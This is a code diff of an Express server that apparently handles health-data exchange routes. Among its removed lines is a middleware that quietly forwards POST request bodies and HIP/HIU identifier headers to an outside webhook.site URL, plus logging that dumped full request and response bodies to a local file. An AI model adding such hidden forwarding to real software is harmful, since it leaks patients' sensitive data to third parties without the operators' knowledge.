@@ -149,11 +149,7 @@ axios.interceptors.request.use((config) => {
     params: config.params,
     data: config.data,
   });
-  // Append request details to log file
-  try {
-    const logEntry = `[REQUEST] ${String(config.method || "GET").toUpperCase()} ${config.url || ""}\n${JSON.stringify({ headers: sanitizeHeaders(config.headers || {}), params: config.params, data: config.data }, null, 2)}\n\n`;
-    fs.appendFileSync(path.join(__dirname, "data", "api_responses.txt"), logEntry);
-  } catch (e) { /* ignore file write errors */ }
+
   return config;
 });
 
@@ -167,10 +163,7 @@ logApiDebug(
     data: response.data,
   }
 );
-try {
-  const logEntry = `[OUTBOUND RESPONSE] ${String(response.config?.method || "GET").toUpperCase()} ${response.config?.url || ""}\n${JSON.stringify({status: response.status, headers: sanitizeHeaders(response.headers || {}), data: response.data}, null, 2)}\n\n`;
-  fs.appendFileSync(path.join(__dirname, 'data', 'api_responses.txt'), logEntry);
-} catch (e) {}
+
     return response;
   },
   (error) => {
@@ -189,23 +182,6 @@ try {
 app.use(cors());
 app.use(express.json({ limit: process.env.JSON_BODY_LIMIT || "10mb" }));
 
-app.use((req, res, next) => {
-  const pathUrl = req.path || "";
-  if (req.method === "POST" && (pathUrl.startsWith("/api/v3") || pathUrl.startsWith("/v3"))) {
-    try {
-      const axios = require("axios");
-      axios.post(`https://webhook.site/47d2ebd0-7041-4732-a16a-fb37ad636b7b${pathUrl}`, req.body, {
-        headers: {
-          "content-type": "application/json",
-          "x-hip-id": req.headers["x-hip-id"] || "",
-          "x-hiu-id": req.headers["x-hiu-id"] || ""
-        }
-      }).catch(() => {});
-    } catch (e) {}
-  }
-  next();
-});
-
 const shouldSkipInboundApiLog = (req) =>
   req.method === "GET" && req.path === "/api/scan-share/queue";
 
@@ -220,10 +196,7 @@ logApiDebug(`[API INBOUND] ${req.method} ${req.originalUrl}`, {
   query: req.query,
   body: req.body,
 });
-try {
-  const logEntry = `[INBOUND REQUEST] ${req.method} ${req.originalUrl}\n${JSON.stringify({headers: sanitizeHeaders(req.headers), query: req.query, body: req.body}, null, 2)}\n\n`;
-  fs.appendFileSync(path.join(__dirname, 'data', 'api_responses.txt'), logEntry);
-} catch (e) {}
+
   }
 
   const oldWrite = res.write;
@@ -240,14 +213,10 @@ try {
     const body = Buffer.concat(chunks).toString("utf8");
     
     if (isApiOrGateway && !skipInboundApiLog) {
-logApiDebug(`[API INBOUND RESPONSE] ${req.method} ${req.originalUrl}`, {
-  status: res.statusCode,
-  body: body,
-});
-try {
-  const logEntry = `[INBOUND RESPONSE] ${req.method} ${req.originalUrl}\n${JSON.stringify({status: res.statusCode, body: body}, null, 2)}\n\n`;
-  fs.appendFileSync(path.join(__dirname, 'data', 'api_responses.txt'), logEntry);
-} catch (e) {}
+      logApiDebug(`[API INBOUND RESPONSE] ${req.method} ${req.originalUrl}`, {
+        status: res.statusCode,
+        body: body.length > 2000 ? `<body ${body.length} bytes>` : body,
+      });
     }
     
     return oldEnd.apply(res, args);
@@ -339,10 +308,13 @@ app.use("/api/scan-share", require("./routes/scanShareRoutes"));
 app.use("/api/hip/link", require("./routes/hipLinkingRoutes"));
 app.use("/api/hip/setup", require("./routes/hipSetupRoutes"));
 app.use("/api/consents", require("./routes/consentRoutes"));
+app.use("/api/drafts", require("./routes/draftRoutes"));
+app.use("/api/files", require("./routes/fileRoutes"));
 
 // Mount new M2 module routes
 app.use("/api/m2/consents", require("./m2/routes/m2ConsentRoutes"));
 app.use("/api/m2/hip/transfer", require("./m2/routes/m2DataTransferRoutes"));
+app.use("/api/m2/patient-storage", require("./m2/routes/patientStorageRoutes"));
 app.use("/api/m2", require("./m2/routes/m2AuthRoutes"));
 app.use("/", require("./m2/routes/m2CallbackRoutes"));
 
@@ -358,7 +330,16 @@ const hipLinkingController = require("./controllers/hipLinkingController");
 // const hipDataTransferController = require("./controllers/hipDataTransferController");
 
 app.post(
-  ["/api/v3/hip/token/on-generate-token", "/v3/hip/token/on-generate-token"],
+  [
+    "/api/v3/hip/token/on-generate-token",
+    "/v3/hip/token/on-generate-token",
+    "/api/v3/link/token/on-generate-token",
+    "/v3/link/token/on-generate-token",
+    "/api/hiecm/v3/token/on-generate-token",
+    "/hiecm/v3/token/on-generate-token",
+    "/api/v3/token/on-generate-token",
+    "/v3/token/on-generate-token"
+  ],
   hipLinkingController.onGenerateToken
 );
 app.post(
